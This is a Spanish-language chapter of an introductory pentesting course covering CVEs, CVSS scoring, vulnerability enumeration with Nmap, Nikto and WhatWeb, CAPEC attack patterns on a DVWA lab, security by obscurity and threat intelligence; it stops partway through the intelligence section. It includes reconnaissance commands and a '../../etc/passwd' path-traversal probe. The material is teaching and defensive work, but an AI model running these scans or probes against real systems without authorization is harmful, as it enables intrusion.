| **Inicio**         | **atrás 8**                                         | **Siguiente 10**                              |
| ------------------ | --------------------------------------------------- | --------------------------------------------- |
| [🏠](../README.md) | [⏪](./7_8_OWASP_Top_10_Riesgos_en_Aplicaciones.md) | [⏩](./7_10_Seguridad_de_Redes_On_Premise.md) |

---

## **Índice**

| Temario                                                                                                                          |
| -------------------------------------------------------------------------------------------------------------------------------- |
| [773. CVE, Microsoft Vuln Database](#773-cve-microsoft-vuln-database)                                                            |
| [774. Enumeración de vulnerabilidades comunes](#774-enumeración-de-vulnerabilidades-comunes)                                     |
| [775. Enumeración y clasificación de patrones de ataque comunes](#775-enumeración-y-clasificación-de-patrones-de-ataque-comunes) |
| [776. Sistema de puntuación de vulnerabilidades comunes](#776-sistema-de-puntuación-de-vulnerabilidades-comunes)                 |
| [777. Seguridad por oscuridad](#777-seguridad-por-oscuridad)                                                                     |
| [778. Obtención de Inteligencia](#778-obtención-de-inteligencia)                                                                 |
| [779. Análisis de Vulnerabilidades](#779-análisis-de-vulnerabilidades)                                                           |
| [780. Técnicas de ataque y explotación de vulnerabilidades](#780-técnicas-de-ataque-y-explotación-de-vulnerabilidades)           |
| [781. Post-explotación](#781-post-explotación)                                                                                   |
| [782. Desarrollo de informes](#782-desarrollo-de-informes)                                                                       |
| [783. Vulnerabilidades de tipo 0-day](#783-vulnerabilidades-de-tipo-0-day)                                                       |
| [784. ¿Qué son los exploits y los payloads?](#784-qué-son-los-exploits-y-los-payloads)                                           |
| [785. Bases de datos de exploits](#785-bases-de-datos-de-exploitsy)                                                              |
| [786. Tipos de exploits](#786-tipos-de-exploits)                                                                                 |
| [787. Ataques de fuerza bruta](#787-ataques-de-fuerza-bruta)                                                                     |
| [788. Ataques de denegación de servicio](#788-ataques-de-denegación-de-servicio)                                                 |
| [789. Spoofing](#789-spoofing)                                                                                                   |
| [790. Fuzzing](#790-fuzzing)                                                                                                     |
| [791. Técnicas de ataques físicos](#791-técnicas-de-ataques-físicos)                                                             |
| [792. Instalación de Kali Linux en Vmware](#792-instalación-de-kali-linux-en-vmware)                                             |

# **Introducción al Pentesting**

## **773. CVE, Microsoft Vuln Database**

### 📌 ¿Qué es una CVE?

**CVE (Common Vulnerabilities and Exposures)** es un sistema público que identifica y clasifica vulnerabilidades de seguridad en software y hardware.

👉 **Cada vulnerabilidad** conocida públicamente recibe un código único: el **ID CVE**.

#### 🔢 Formato de un CVE:

```
CVE-AÑO-NÚMERO
```

Ejemplo:

```
CVE-2023-23397
```

➡️ Este fue un **fallo crítico en Microsoft Outlook** que permitía ejecución de código remoto.

---

### 🧠 ¿Por qué es importante?

- 📣 Las CVEs son **referencias universales** de vulnerabilidades.
- 🔄 Permite a empresas, desarrolladores y administradores **estar al tanto de los fallos** conocidos.
- 🧰 Los sistemas de seguridad (antivirus, escáneres, SIEMs) **usan los ID de CVE para actualizar reglas de detección**.

---

### 📚 ¿Qué es la Microsoft Vulnerability Database?

Es la **base de datos oficial de vulnerabilidades** de productos Microsoft.

#### Incluye:

- Windows
- Office
- Exchange
- Azure
- Microsoft Edge
- SQL Server
- Visual Studio, etc.

La base se actualiza frecuentemente con nuevos boletines de seguridad.

🧭 Se encuentra en:

🔗 [https://msrc.microsoft.com/update-guide](https://msrc.microsoft.com/update-guide)

---

### 🔍 Ejemplo de CVE de Microsoft

#### 🛑 CVE-2023-36884

**Descripción**: Vulnerabilidad en Microsoft Office que permite ejecución de código remoto (RCE) cuando se abre un archivo malicioso.

**Productos afectados**:

- Word 2016, 2019
- Office 365
- Windows Server

**Solución**:

- Parche liberado por Microsoft en agosto 2023.

**Gravedad**:

- CVSS Score: 8.8 (Alta)

---

### 🧰 ¿Cómo buscar CVEs de Microsoft?

#### Opción 1: Usar el sitio de Microsoft

1. Ir a: [https://msrc.microsoft.com/update-guide](https://msrc.microsoft.com/update-guide)
2. Escribe un producto, por ejemplo: `Windows 11`
3. Aplica filtros: "Critical", "2024", etc.
4. Haz clic en una CVE para ver:

   - Afectados
   - Soluciones
   - Links a parches
   - Descripción técnica

---

#### Opción 2: Usar la terminal (Linux/macOS)

Instala una herramienta llamada `cve-search` o `nvdcli`.

```bash
pip install nvdlib
```

Luego puedes hacer consultas como:

```python
import nvdlib

results = nvdlib.searchCVE(keyword="Microsoft Outlook", pubStartDate="2023-01-01T00:00:00:000 UTC")
for cve in results:
    print(cve.id, "-", cve.description)
```

---

### 🖥️ ¿Cómo instalar parches de seguridad de CVEs en Microsoft?

1. 🪟 **Windows Update**:

   - Ir a **Configuración > Actualización y Seguridad > Windows Update**
   - Asegúrate de tener habilitadas las **actualizaciones automáticas**.

2. 🔐 **WSUS o SCCM** (para empresas):
   Microsoft publica parches para que los administradores los apliquen automáticamente en redes empresariales.

3. 💻 **Descarga manual**:

   Desde la guía de actualizaciones de Microsoft:

   - Buscar la CVE
   - Descargar el parche en `.msu` o `.exe`
   - Ejecutar manualmente

---

### ⚙️ Cómo preparar un laboratorio para probar CVEs

#### ✅ Usa máquinas virtuales o contenedores

1. Instala **VirtualBox o VMware**
2. Descarga una ISO de Windows vulnerable (por ejemplo Windows 10 sin parches)
3. Crea un entorno **Aislado y sin acceso a internet**
4. Simula ataques conocidos con herramientas como:

   - **Metasploit**
   - **ExploitDB**
   - **CVE Details + PoCs de GitHub**

⚠️ **Nunca pruebes vulnerabilidades en máquinas reales o en redes en producción.**

---

### 📄 Ejemplo completo: CVE-2023-23397 (Outlook)

#### 📝 Descripción

Este CVE permite a un atacante **enviar un correo con una propiedad maliciosa (reminder sound)** que automáticamente solicita un recurso desde una URL (SMB), robando el **hash NTLM del usuario**.

#### 💥 Impacto

- No requiere que el usuario abra el correo
- Afecta Outlook para escritorio en Windows
- Permite **robo de credenciales** y movimiento lateral

#### 🛡️ Solución

Microsoft lanzó un parche:

- Ver [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397)

---

### ✅ ¿Cómo saber si estás protegido?

- Usa **Microsoft Security Update Guide**
- O ejecuta en PowerShell:

```powershell
Get-HotFix | Where-Object {$_.Description -match "Security"}
```

---

### 🔐 ¿Cómo protegerte de las CVEs en general?

| Medida                          | Descripción                                |
| ------------------------------- | ------------------------------------------ |
| ✅ Aplicar parches rápidamente  | Revisa parches mensuales de Microsoft      |
| 🔒 Limita el acceso de usuarios | Principio de menor privilegio              |
| 📡 Usa un WAF o firewall        | Detecta intentos de explotación            |
| 📦 Usa software actualizado     | Nada de versiones viejas sin soporte       |
| 🧪 Realiza escaneos periódicos  | Herramientas como Nessus, OpenVAS o Qualys |

---

### 📌 RESUMEN FINAL

| Concepto             | Explicación                                                                        |
| -------------------- | ---------------------------------------------------------------------------------- |
| 📘 ¿Qué es una CVE?  | Código único para cada vulnerabilidad pública                                      |
| 🛠️ ¿Dónde las veo?   | [https://msrc.microsoft.com/update-guide](https://msrc.microsoft.com/update-guide) |
| 🔐 ¿Cómo me protejo? | Aplicar parches, limitar acceso, escanear sistemas                                 |
| 👨‍💻 ¿Puedo probarlas? | Sí, en laboratorios con VMs aisladas y herramientas como Metasploit                |

---

[🔼](#índice)

---

## **774. Enumeración de vulnerabilidades comunes**

### 🧠 ¿Qué es la enumeración de vulnerabilidades?

La **enumeración de vulnerabilidades** es el proceso de **identificar posibles fallos de seguridad** en un sistema, red o aplicación, **antes de que sean explotados**.

> Es como revisar todas las puertas y ventanas de una casa para ver si alguna está abierta.

#### ⚠️ OJO:

No estamos explotando las vulnerabilidades aún. Solo **descubriéndolas y listándolas**.

---

### 🧱 ¿Qué se puede enumerar?

1. **Puertos abiertos** (ej. puerto 22 SSH, 80 HTTP)
2. **Servicios y versiones** (ej. Apache 2.4.18)
3. **Sistemas operativos**
4. **Usuarios y contraseñas por defecto**
5. **CMS o frameworks usados** (ej. WordPress, Laravel)
6. **Parches faltantes**
7. **Errores de configuración**
8. **Software vulnerable con CVEs conocidas**

---

### 🎯 ¿Por qué es importante?

- 📌 Permite encontrar puntos débiles antes que los atacantes.
- 🧰 Es el paso base para hacer **auditorías o pentesting**.
- 💡 Informa qué parches o cambios deben aplicarse.

---

### 🛠️ Herramientas populares para enumerar vulnerabilidades

| Herramienta   | ¿Para qué sirve?                                   |
| ------------- | -------------------------------------------------- |
| 🔎 Nmap       | Escaneo de puertos y servicios                     |
| 🧪 Nikto      | Detección de vulnerabilidades en servidores web    |
| 🕸️ WhatWeb    | Identifica tecnologías web utilizadas              |
| 🕵️‍♂️ Wappalyzer | Detecta frameworks, CMS, librerías                 |
| 📦 Nessus     | Escáner de vulnerabilidades automatizado           |
| 🔧 OpenVAS    | Escáner open-source muy completo                   |
| 🐚 Metasploit | Framework para explotación, también detecta fallos |
| 🔧 Lynis      | Auditoría de sistemas Linux                        |

---

### 🖥️ Cómo instalar herramientas de enumeración

#### ✅ 1. Nmap (escaneo de puertos y servicios)

```bash
sudo apt update && sudo apt install nmap -y
```

Ejemplo de uso:

```bash
nmap -sV -O 192.168.1.10
```

- `-sV` = detecta versión de servicios
- `-O` = detecta sistema operativo

---

#### ✅ 2. Nikto (vulnerabilidades en web)

```bash
sudo apt install nikto -y
```

Ejemplo:

```bash
nikto -h http://192.168.1.10
```

---

#### ✅ 3. WhatWeb (tecnologías web)

```bash
sudo apt install whatweb -y
```

Ejemplo:

```bash
whatweb http://example.com
```

---

#### ✅ 4. Wappalyzer (como extensión del navegador)

- Instálalo en Chrome o Firefox desde:
  👉 [https://www.wappalyzer.com/](https://www.wappalyzer.com/)

Detecta automáticamente:

- WordPress
- PHP, Laravel, jQuery
- Google Analytics, Cloudflare, etc.

---

#### ✅ 5. OpenVAS (Greenbone)

**Instalación rápida en Kali Linux**:

```bash
sudo apt install openvas -y
sudo gvm-setup
```

Accede vía navegador:

👉 `https://localhost:9392`

(Usuario: `admin`, contraseña generada en consola)

---

#### ✅ 6. Nessus

1. Ve a: [https://www.tenable.com/products/nessus](https://www.tenable.com/products/nessus)
2. Descarga e instala según tu sistema.
3. Inicia el servicio:

```bash
sudo systemctl start nessusd
```

4. Accede en: `https://localhost:8834`

---

### 🧪 Ejemplo completo paso a paso

#### Objetivo: Enumerar vulnerabilidades en un servidor web

##### 🔧 Paso 1: Escaneo de puertos y servicios

```bash
nmap -sV -O 192.168.1.10
```

Resultado:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6
80/tcp   open  http       Apache httpd 2.4.18
3306/tcp open  mysql      MySQL 5.7.22
```

---

##### 🔧 Paso 2: Detectar tecnologías web

```bash
whatweb http://192.168.1.10
```

Resultado:

```
Apache[2.4.18], PHP[7.0.33], WordPress[4.9.8], MySQL[5.7]
```

---

##### 🔧 Paso 3: Buscar vulnerabilidades conocidas (CVE)

Puedes ir a:

- 🔍 [https://cvedetails.com](https://cvedetails.com)
- Busca: `Apache 2.4.18` o `WordPress 4.9.8`

Vulnerabilidad detectada:

```
CVE-2018-6389 - DoS en WordPress 4.9.8
```

---

##### 🔧 Paso 4: Escaneo automático con Nikto

```bash
nikto -h http://192.168.1.10
```

Resultado:

```
+ Server: Apache/2.4.18
+ X-Powered-By: PHP/7.0.33
+ Allowed HTTP Methods: GET, POST, OPTIONS
+ Outdated WordPress version found: 4.9.8
+ Cookie without HttpOnly flag set.
```

---

### 🛡️ ¿Qué hacer con los resultados?

| Resultado              | Acción recomendada                     |
| ---------------------- | -------------------------------------- |
| WordPress 4.9.8        | Actualizar a última versión            |
| Apache 2.4.18          | Aplicar últimos parches de seguridad   |
| MySQL 5.7.22           | Verificar si tiene fallos reportados   |
| Métodos HTTP inseguros | Restringir a solo GET/POST             |
| Cookies sin `HttpOnly` | Configurar correctamente las cabeceras |

---

### 🧭 Resumen general

| Concepto                | Detalle                                               |
| ----------------------- | ----------------------------------------------------- |
| ¿Qué es la enumeración? | Proceso de identificar fallos potenciales             |
| ¿Qué herramientas usar? | Nmap, Nikto, WhatWeb, Nessus, OpenVAS                 |
| ¿Cómo instalar?         | Usando apt o desde los sitios oficiales               |
| ¿Qué buscar?            | Puertos, versiones, configuraciones, CMS              |
| ¿Cómo actuar?           | Actualizar software, cerrar puertos, reforzar headers |

---

### 🎓 ¿Y después?

La enumeración es **solo el comienzo** del proceso de análisis de seguridad. Luego puedes:

- Hacer pruebas de explotación (pentesting ético)
- Corregir vulnerabilidades encontradas
- Monitorear constantemente tu sistema

---

[🔼](#índice)

---

## **775. Enumeración y clasificación de patrones de ataque comunes**

### ✅ ¿Qué significa esto?

Este proceso consiste en:

- **Enumerar** ➝ identificar y listar los **ataques más comunes** que usan los ciberdelincuentes.
- **Clasificar** ➝ agrupar esos ataques según su **tipo, propósito o técnica utilizada**.

Esto es clave en **ciberseguridad** para poder **detectar, prevenir y mitigar** ataques antes de que causen daño.

---

### 🧠 ¿Por qué es importante?

- Ayuda a entender cómo **piensa un atacante**.
- Permite aplicar **defensas específicas** según el tipo de ataque.
- Facilita la **automatización de la detección** con herramientas SIEM, WAF, IDS/IPS, etc.

---

### 📦 ¿Dónde están documentados estos patrones?

Uno de los recursos más utilizados es el proyecto:

#### 🔗 **CAPEC** – Common Attack Pattern Enumeration and Classification

👉 [https://capec.mitre.org](https://capec.mitre.org)

Creado por MITRE (los mismos de CVE), es una base de datos abierta de **patrones de ataque comunes**, como:

- Inyección SQL
- Cross-Site Scripting (XSS)
- Escalada de privilegios
- Robo de sesión
- Ataques de diccionario
- Abuso de funciones expuestas

---

### 📚 Clasificación por tipo de ataque

Aquí tienes una clasificación simple y clara:

| Categoría                         | Ejemplos comunes                                          |
| --------------------------------- | --------------------------------------------------------- |
| 🔐 **Ataques a autenticación**    | Fuerza bruta, credenciales por defecto, abuso de sesiones |
| 💉 **Inyecciones**                | SQL Injection, Command Injection, LDAP Injection          |
| 🌐 **Ataques a aplicaciones web** | XSS, CSRF, Directory Traversal, File Inclusion            |
| 🧠 **Ingeniería social**          | Phishing, Baiting, Pretexting                             |
| 🕸 **Ataques a redes**             | ARP Spoofing, DoS, MITM (Man in the Middle)               |
| 🎯 **Explotación de software**    | Buffer Overflow, RCE, ataques por CVE                     |
| 🧰 **Abuso de lógica**            | Bypass de validaciones, modificación de parámetros        |
| 🧱 **Escalada de privilegios**    | Local (LPE) y Remota (RPE)                                |

---

### 🛠️ Herramientas para enumerar y clasificar patrones de ataque

| Herramienta          | ¿Qué hace?                                                                  |
| -------------------- | --------------------------------------------------------------------------- |
| **Metasploit**       | Framework para simular ataques reales y ver patrones usados                 |
| **OWASP ZAP**        | Analiza sitios web, muestra vectores de ataque                              |
| **Burp Suite**       | Identifica ataques web, clasifica por tipo                                  |
| **Snort / Suricata** | IDS/IPS que clasifican tráfico malicioso por patrón                         |
| **MITRE ATT\&CK**    | Base de conocimiento sobre técnicas de ataque avanzadas (APT, malware, etc) |

---

### 🖥️ Cómo instalar e iniciar algunas herramientas

#### 🔧 1. Metasploit

```bash
sudo apt update
sudo apt install metasploit-framework -y
msfconsole
```

```bash
# Buscar un patrón de ataque (ejemplo: SQL injection)
search sql_injection
```

---

#### 🔧 2. OWASP ZAP

```bash
sudo snap install zaproxy --classic
```

Luego ejecútalo con:

```bash
zap
```

Usa el escáner para detectar patrones de ataques en una URL.

---

#### 🔧 3. Burp Suite (Community Edition)

1. Descargar desde:

   👉 [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)

2. Instalarlo y configurarlo como **proxy de tu navegador**.

3. Visita un sitio, y Burp capturará las peticiones, buscando patrones como:

   - Parámetros modificables
   - Posibles vectores XSS, SQLi, etc.

---

### 📋 Ejemplo completo paso a paso

#### 🎯 Objetivo: Enumerar y clasificar ataques en una aplicación web vulnerable

Vamos a usar **DVWA (Damn Vulnerable Web App)** como laboratorio.

#### ✅ Paso 1: Instalar DVWA (en Kali Linux o Ubuntu)

```bash
sudo apt install apache2 php php-mysqli mariadb-server git -y
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA
```

Configura la base de datos:

```bash
sudo mysql
CREATE DATABASE dvwa;
CREATE USER 'dvwauser'@'localhost' IDENTIFIED BY 'dvwapass';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwauser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

Edita el archivo `/var/www/html/DVWA/config/config.inc.php` con tus datos.

Luego accede en tu navegador:

```
http://localhost/DVWA
```

---

#### ✅ Paso 2: Escanear DVWA con OWASP ZAP

1. Abre ZAP.
2. Introduce la URL: `http://localhost/DVWA`
3. Inicia un escaneo activo.

ZAP te mostrará patrones de ataque detectados como:

| Categoría             | Detalle encontrado                             |
| --------------------- | ---------------------------------------------- |
| SQL Injection         | Entrada de login vulnerable a inyección SQL    |
| XSS Reflejado         | Campos de búsqueda no filtran scripts          |
| Directory Traversal   | El parámetro `?page=../../etc/passwd` funciona |
| Cookie sin `HttpOnly` | Vulnerable a robo de sesión                    |

---

#### ✅ Paso 3: Clasificar los ataques encontrados

| Tipo de ataque    | Clasificación CAPEC | Nivel de riesgo |
| ----------------- | ------------------- | --------------- |
| SQL Injection     | CAPEC-66            | Alto            |
| XSS (Reflected)   | CAPEC-86            | Medio           |
| Path Traversal    | CAPEC-126           | Alto            |
| Session Hijacking | CAPEC-137           | Alto            |

---

### 🎓 Bonus: MITRE ATT\&CK vs CAPEC

- **CAPEC** se enfoca en **cómo** se realiza el ataque (ej: inyección, spoofing).
- **MITRE ATT\&CK** se enfoca en **para qué** se usa el ataque (ej: robo de credenciales, persistencia, exfiltración).

¡Ambos son complementarios!

---

### 📦 RESUMEN FINAL

| Concepto                     | Explicación sencilla                                         |
| ---------------------------- | ------------------------------------------------------------ |
| 🔍 Enumeración de ataques    | Detectar y listar posibles vectores usados por atacantes     |
| 🧠 Clasificación de ataques  | Agrupar según técnica o tipo de vulnerabilidad               |
| 📚 Base de datos recomendada | CAPEC (Common Attack Pattern Enumeration and Classification) |
| 🛠️ Herramientas clave        | OWASP ZAP, Metasploit, Burp Suite, Snort, Suricata           |
| 🧪 Laboratorio recomendado   | DVWA, Mutillidae, Juice Shop                                 |
| ✅ Resultado esperado        | Una lista organizada de fallos con su riesgo y solución      |

---

[🔼](#índice)

---

## **776. Sistema de puntuación de vulnerabilidades comunes**

### 🧠 Definición

**CVSS** significa:

📌 _Common Vulnerability Scoring System_
Es un sistema estándar para **medir la gravedad** de una vulnerabilidad de seguridad informática.

> Como cuando un médico usa una escala para evaluar cuán grave es una herida.

---

### 🎯 ¿Para qué sirve?

- Ayuda a **priorizar parches o acciones** de seguridad.
- Permite a empresas entender si una vulnerabilidad es **crítica o baja**.
- Lo usan bases de datos como:

  - [🔐 NVD (National Vulnerability Database)](https://nvd.nist.gov/)
  - [🔎 CVE Details](https://www.cvedetails.com/)
  - [🛡️ MITRE CVE](https://cve.mitre.org/)

---

### 🧮 ¿Cómo funciona la puntuación?

CVSS da un puntaje de **0.0 a 10.0**:

| Puntaje | Nivel de gravedad |
| ------- | ----------------- |
| 0.0     | Ninguna           |
| 0.1–3.9 | Baja              |
| 4.0–6.9 | Media             |
| 7.0–8.9 | Alta              |
| 9.0–10  | Crítica           |

---

### 🧱 ¿Cómo se calcula?

CVSS tiene 3 grupos de métricas:

| Métrica           | ¿Qué evalúa?                     | Ejemplo                      |
| ----------------- | -------------------------------- | ---------------------------- |
| **Base**          | Impacto y facilidad de ataque    | ¿Requiere login? ¿Es remoto? |
| **Temporal**      | Si existe solución disponible    | ¿Tiene parche oficial?       |
| **Environmental** | Impacto específico en tu entorno | ¿Afecta un sistema crítico?  |

---

### 🔢 Ejemplo de puntuación: CVE-2021-44228 (Log4Shell)

- Es una vulnerabilidad de ejecución remota (RCE).
- Permite ejecutar comandos en un servidor a través de logs.

**CVSS Base Score: 10.0 (Crítica)**

¿Por qué?

| Métrica                 | Valor   |
| ----------------------- | ------- |
| Vector de ataque        | Red     |
| Complejidad del ataque  | Baja    |
| Privilegios requeridos  | Ninguno |
| Interacción del usuario | Ninguna |
| Confidencialidad        | Alta    |
| Integridad              | Alta    |
| Disponibilidad          | Alta    |

---

### 🌍 Calculadores de CVSS

Hay dos formas de calcularlo:

#### 1. 🔗 En línea (más fácil)

Usa la calculadora oficial de FIRST:

👉 [https://www.first.org/cvss/calculator/3.1](https://www.first.org/cvss/calculator/3.1)

Te permite elegir valores y ver cómo cambia el puntaje.

---

#### 2. 🖥️ Localmente (CLI)

#### 🔧 Instalar el CVSS Calculator en Linux

Usaremos la herramienta de código abierto: [`cvsscalculator`](https://github.com/pandatix/cvsscalculator)

##### Paso 1: Instalar Python y Git

```bash
sudo apt update
sudo apt install python3 git -y
```

##### Paso 2: Clonar repositorio

```bash
git clone https://github.com/pandatix/cvsscalculator.git
cd cvsscalculator
```

##### Paso 3: Ejecutar

```bash
python3 cvsscalculator.py
```

Verás algo como:

```
Enter Attack Vector (N/A/L/A/P): N
Enter Attack Complexity (L/H): L
Enter Privileges Required (N/L/H): N
...
Final CVSS score: 9.8
```

---

### 💡 Ejemplo completo paso a paso

#### 🎯 Escenario: Inyección SQL sin autenticación

Supón que encuentras una inyección SQL en un sistema que:

- Se accede desde internet (Red)
- No requiere login
- No requiere interacción del usuario
- Puede leer/modificar bases de datos

#### ✅ Paso 1: Ir al calculador en línea

👉 [https://www.first.org/cvss/calculator/3.1](https://www.first.org/cvss/calculator/3.1)

#### ✅ Paso 2: Llenar los campos

| Métrica               | Valor         |
| --------------------- | ------------- |
| AV (Vector de ataque) | Network (N)   |
| AC (Complejidad)      | Low (L)       |
| PR (Privilegios)      | None (N)      |
| UI (Interacción)      | None (N)      |
| S (Ámbito)            | Unchanged (U) |
| C (Confidencialidad)  | High (H)      |
| I (Integridad)        | High (H)      |
| A (Disponibilidad)    | None (N)      |

**Resultado: CVSS 9.1 – Alta/Crítica**

---

### 📋 ¿Dónde buscar la puntuación CVSS ya calculada?

Puedes buscar cualquier CVE en:

- [🔐 NVD (National Vulnerability Database)](https://nvd.nist.gov)
- [🔎 CVE Details](https://www.cvedetails.com)

Por ejemplo, busca `CVE-2021-26855` (vulnerabilidad de Exchange):

Verás:

- **CVSS v3 Score: 9.1 (Crítica)**
- **Vector: AV\:N/AC\:L/PR\:N/UI\:N/S\:U/C\:H/I\:H/A\:H**

---

### 🛡️ ¿Cómo usar CVSS en tu organización?

1. 🧾 **Auditoría:** Clasifica las vulnerabilidades encontradas según su CVSS.
2. 🔥 **Prioriza:** Aplica parches primero a las que tienen CVSS ≥ 7.0.
3. 🛠 **Automatiza:** Herramientas como Nessus, OpenVAS o Qualys ya muestran CVSS.
4. 🧠 **Capacita al equipo:** para interpretar y responder según la gravedad.

---

### 🧭 RESUMEN GENERAL

| Concepto            | Explicación rápida                               |
| ------------------- | ------------------------------------------------ |
| **¿Qué es CVSS?**   | Sistema que mide la gravedad de vulnerabilidades |
| **Escala**          | 0 a 10 (Crítica desde 9.0)                       |
| **Dónde se aplica** | En CVEs, informes de seguridad, escáneres        |
| **Cómo calcularlo** | En línea o con herramientas en Python            |
| **Ejemplo común**   | Inyección SQL sin login ➝ CVSS 9.1               |

---

[🔼](#índice)

---

## **777. Seguridad por oscuridad**

### 🧠 Definición simple

La **Seguridad por Oscuridad** (en inglés, _Security through obscurity_) es una **estrategia de seguridad** que consiste en **ocultar información** crítica, **confiando en que los atacantes no la descubrirán**.

> Básicamente: “Si nadie sabe cómo funciona, entonces no lo pueden atacar”.

---

### 🧱 ¿Ejemplos típicos?

- Usar un **puerto raro** en lugar del estándar (ej. SSH en el puerto 2323 en lugar de 22).
- Cambiar el nombre de archivos críticos (`admin.php` → `hidden_admin.php`).
- Ocultar el código fuente en lugar de protegerlo correctamente.
- No documentar una API pública para que “nadie la use”.
- No usar cifrado, pero “nadie sabe dónde están los datos”.

---

### ❌ ¿Por qué NO es suficiente?

Confiar solo en que el atacante **no encontrará algo** es **muy débil**:

- Los escáneres automáticos **descubren puertos ocultos** fácilmente.
- Los archivos renombrados **pueden ser encontrados por fuerza bruta**.
- Si alguien logra descubrir lo oculto, ya no hay más defensas.

### 📢 **Conclusión clave:**

> La seguridad debe basarse en **defensas robustas**, no solo en **esconder cosas**.

---

### 🛡️ ¿Cuándo se puede usar?

La seguridad por oscuridad puede ser **un refuerzo extra**, **nunca la defensa principal**.

Por ejemplo:

- Está bien cambiar el puerto SSH para evitar bots básicos.
- Está bien renombrar rutas de administración para reducir escaneo automatizado.

**Pero siempre debes tener autenticación, firewalls, permisos, cifrado, etc.**

---

### 🔧 Instalación / Implementación de ejemplos

No se instala como tal, pero veamos **cómo se implementan** estrategias de “oscuridad” (aunque no recomendadas por sí solas).

---

### 🧪 Ejemplo 1: Cambiar el puerto SSH

#### Paso 1: Editar archivo de configuración

```bash
sudo nano /etc/ssh/sshd_config
```

Busca esta línea:

```bash
#Port 22
```

Cámbiala a:

```bash
Port 2222
```

#### Paso 2: Reiniciar el servicio

```bash
sudo systemctl restart ssh
```

#### Paso 3: Conectarte con el nuevo puerto

```bash
ssh usuario@ip_del_servidor -p 2222
```

🎯 Esto puede evitar algunos bots automáticos, **pero no protege de escaneos con Nmap**:

```bash
nmap -p- ip_del_servidor
```

---

### 🧪 Ejemplo 2: Ocultar una página de administración

#### Escenario:

Tienes una página `admin.php` y la renombras a `qwerty_control.php`.

```bash
mv admin.php qwerty_control.php
```

En tu frontend ya no hay enlaces visibles, y ahora solo tú sabes que debes visitar:

```
https://midominio.com/qwerty_control.php
```

Esto **no evita** que un atacante use herramientas como:

```bash
gobuster dir -u https://midominio.com -w /usr/share/wordlists/dirb/common.txt
```

Ese escaneo **podría descubrir** el archivo igualmente.

---

### ✅ Ejemplo completo: Comparar seguridad real vs seguridad por oscuridad

| Escenario                            | Seguridad por oscuridad | Seguridad real                         |
| ------------------------------------ | ----------------------- | -------------------------------------- |
| Cambio de puerto SSH                 | `Port 2222`             | Firewall, autenticación con llaves SSH |
| Renombrar `admin.php` a `hidden.php` | Oculta la ruta          | Requiere login seguro y control de IPs |
| No decir cómo cifras datos           | “Nadie lo sabe”         | Usar AES 256, algoritmos bien probados |
| No publicar una API                  | Nadie la conoce         | Autenticación JWT, control de acceso   |

---

### 🚨 Por qué confiar en la oscuridad **es un error**

#### Imagínalo así:

🔒 Seguridad real:

> “Aunque sepas cómo está protegido, **no puedes entrar**.”

🕵️ Seguridad por oscuridad:

> “Espero que no descubras cómo entrar...”

La **criptografía moderna** es pública (AES, RSA, etc.), pero **sigue siendo segura** porque no depende del secreto, sino de su **robusta matemática**.

---

### 🔐 Recomendación final

Usa la oscuridad solo como **una capa extra**:

✅ Ejemplos válidos:

- Ocultar puertos de servicios que ya están bien asegurados.
- No exponer documentación de API innecesaria.
- No anunciar rutas administrativas públicamente.

❌ **Nunca ocultes como única defensa**:

- Contraseñas en el código
- Algoritmos secretos
- Archivos sensibles sin permisos

---

### 🧭 Resumen

| Punto Clave         | Detalle                                    |
| ------------------- | ------------------------------------------ |
| ¿Qué es?            | Estrategia que se basa en “esconder cosas” |
| ¿Sirve?             | Solo como **capa extra**, no única defensa |
| Ejemplos buenos     | Cambiar puertos, ocultar paneles           |
| Ejemplos peligrosos | No cifrar datos, no usar autenticación     |
| Mejores prácticas   | Combinar oscuridad + seguridad robusta     |

---

[🔼](#índice)

---

## **778. Obtención de Inteligencia**

### 🧾 Definición

**La Obtención de Inteligencia (Cyber Threat Intelligence o CTI)** es el proceso de **recopilar, analizar y usar información** sobre amenazas potenciales para:

- Prevenir ataques
- Detectar actividades maliciosas
- Tomar decisiones informadas en ciberseguridad

> Es como tener un “espía digital” que te avisa de los peligros antes de que ocurran.

---

### 🎯 ¿Para qué sirve?

- ⚠️ Conocer qué tipos de ataques están ocurriendo actualmente
- 🕵️‍♂️ Identificar actores maliciosos y sus métodos
- 🔐 Ajustar firewalls, reglas IDS/IPS y políticas
- 🚨 Detectar vulnerabilidades antes de que sean explotadas

---

### 🧩 Tipos de inteligencia

| Tipo            | ¿Qué incluye?                                 | Ejemplo                          |
| --------------- | --------------------------------------------- | -------------------------------- |
| **Táctica**     | Indicadores técnicos: IPs, URLs, hashes, etc. | IP maliciosa: `185.234.219.7`    |
| **Operacional** | Información sobre ataques en tiempo real      | Campaña activa de phishing       |
| **Estratégica** | Contexto general de amenazas                  | Tendencias de ransomware en 2025 |
| **Técnica**     | Métodos de ataque, herramientas, malware      | Exploit para Log4Shell           |

---

### 🧰 ¿Cómo se hace la obtención de inteligencia?

---

#### 🔍 Fuentes abiertas (OSINT)

**OSINT = Open Source Intelligence**
Recopilas datos públicos disponibles en internet:

- Motores como [Shodan](https://www.shodan.io/)
- Repositorios de IOCs (Indicators of Compromise)
- Noticias de seguridad
- Twitter/X de investigadores
- Pastebin, foros, blogs

---

### 🛠️ Herramientas populares para obtener inteligencia

| Herramienta      | ¿Qué hace?                              |
| ---------------- | --------------------------------------- |
| **Maltego**      | Mapea relaciones entre entidades        |
| **TheHarvester** | Busca correos, dominios, hosts          |
| **SpiderFoot**   | OSINT automatizado sobre una entidad    |
| **VirusTotal**   | Análisis de archivos y URLs maliciosas  |
| **MISP**         | Plataforma colaborativa de threat intel |
| **Shodan**       | Escaneo de dispositivos expuestos       |
| **Censys**       | Similar a Shodan, más profundo          |

---

### 🛠️ ¿Cómo instalar herramientas para inteligencia?

---

#### 💻 Ejemplo: Instalar TheHarvester (herramienta de OSINT)

```bash
# Requiere Python 3
sudo apt update
sudo apt install git python3-pip -y

# Clonamos el repositorio oficial
git clone https://github.com/laramies/theHarvester.git
cd theHarvester

# Instalamos dependencias
pip3 install -r requirements.txt

# Lo ejecutamos
python3 theHarvester.py -d target.com -b google
```

🔎 Esto busca información pública sobre `target.com` en Google.

---

#### 🐍 Instalar SpiderFoot (más automatizado)

```bash
